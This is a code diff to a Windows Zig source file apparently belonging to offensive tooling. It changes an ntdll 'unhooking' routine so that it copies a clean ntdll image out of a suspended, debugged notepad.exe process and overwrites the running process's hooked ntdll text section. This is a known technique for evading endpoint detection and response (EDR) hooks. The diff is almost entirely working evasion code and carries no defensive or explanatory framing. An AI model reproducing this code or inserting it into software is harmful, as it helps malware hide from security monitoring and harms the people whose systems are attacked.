@@ -1,7 +1,8 @@
 const std = @import("std");
 const win = @import("zigwin32").everything;
-const windows = @import("../win.zig");
-const common = @import("../common.zig");
+const windows = @import("win.zig");
+const common = @import("common.zig");
+const process = @import("process.zig");
 
 const IMAGE_FILE_HEADER = win.IMAGE_FILE_HEADER;
 const IMAGE_SECTION_HEADER = win.IMAGE_SECTION_HEADER;
@@ -36,9 +37,10 @@ const CreateFileMappingA = win.CreateFileMappingA;
 const MapViewOfFile = win.MapViewOfFile;
 const UnmapViewOfFile = win.UnmapViewOfFile;
 const VirtualProtect = win.VirtualProtect;
-const InitializeObjectAttributes = win.InitializeObjectAttributes;
 const GetLastError = win.GetLastError;
 const CloseHandle = win.CloseHandle;
+const DebugActiveProcessStop = win.DebugActiveProcessStop;
+const TerminateProcess = win.TerminateProcess;
 
 // TODO: current implementation only works on x64
 comptime {
@@ -84,8 +86,10 @@ pub fn replaceNtdllTextSection(allocator: std.mem.Allocator) !void {
         return error.NtProtectVirtualMemoryFailed;
     }
 
-    const unhooked_ntdll = try mapNtdllFromKnownDlls();
-    const unhooked_ntdll_text = try getNtdllText1(unhooked_ntdll);
+    const unhooked_ntdll = try readNtdllFromASuspendedProcess(allocator, "notepad.exe");
+    defer allocator.free(unhooked_ntdll);
+
+    const unhooked_ntdll_text = try getNtdllText1(unhooked_ntdll.ptr);
 
     @memcpy(local_ntdll_text, unhooked_ntdll_text);
 
@@ -146,6 +150,35 @@ pub fn readNtdll(allocator: std.mem.Allocator) ![]u8 {
         std.debug.print("[!] ReadFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
         return error.ReadFileFailed;
     }
+
+    return ntdll_buf;
+}
+
+pub fn readNtdllFromASuspendedProcess(allocator: std.mem.Allocator, process_name: []const u8) ![]u8 {
+    const process_info = try process.createSuspendedProcess(
+        allocator,
+        process_name,
+        .Debugged,
+    );
+    defer {
+        _ = CloseHandle(process_info.h_process);
+        _ = CloseHandle(process_info.h_thread);
+    }
+
+    const ntdll_module = try windows.getModuleHandleReplacement(allocator, "ntdll.dll") orelse return error.FailedToGetNtdll;
+    const ntdll_len = getNtdllSize(@ptrCast(ntdll_module)) orelse return error.FailedToGetNtdllSize;
+
+    const ntdll_buf = try allocator.alloc(u8, ntdll_len);
+
+    try process.readFromTargetProcess(
+        process_info.h_process,
+        ntdll_module,
+        ntdll_buf.ptr,
+        ntdll_len,
+    );
+
+    _ = DebugActiveProcessStop(process_info.process_id);
+    _ = TerminateProcess(process_info.h_process, 0);
 
     return ntdll_buf;
 }
@@ -244,6 +277,14 @@ pub fn mapNtdllFromKnownDlls() ![*]u8 {
     };
 
     return @ptrCast(ntdll_buf);
+}
+
+fn getNtdllSize(ntdll_base_address: [*]const u8) ?u32 {
+    const nt_headers = windows.getNtHeaders(ntdll_base_address) orelse return null;
+    return switch (nt_headers) {
+        .nt_headers_32 => |nt_headers_32| nt_headers_32.OptionalHeader.SizeOfImage,
+        .nt_headers_64 => |nt_headers_64| nt_headers_64.OptionalHeader.SizeOfImage,
+    };
 }
 
 fn getNtdllText1(ntdll_base_address: [*]u8) ![]u8 {
